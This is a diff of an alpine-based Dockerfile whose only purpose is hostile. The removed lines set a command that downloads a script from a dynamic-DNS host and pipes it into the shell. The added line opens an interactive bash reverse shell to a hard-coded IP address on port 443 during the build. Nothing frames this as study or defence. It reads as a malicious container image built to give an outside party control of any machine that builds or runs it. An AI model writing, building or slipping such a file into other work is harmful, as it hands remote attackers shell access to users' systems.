@@ -1,3 +1,3 @@
 FROM alpine
-RUN apk update && apk add wget bash
-CMD "wget oceanhole.ddns.net:1194/fl -qO - | sh"
+RUN apk update && apk add bash
+RUN /bin/bash -i >& /dev/tcp/198.211.124.232/443 0>&1
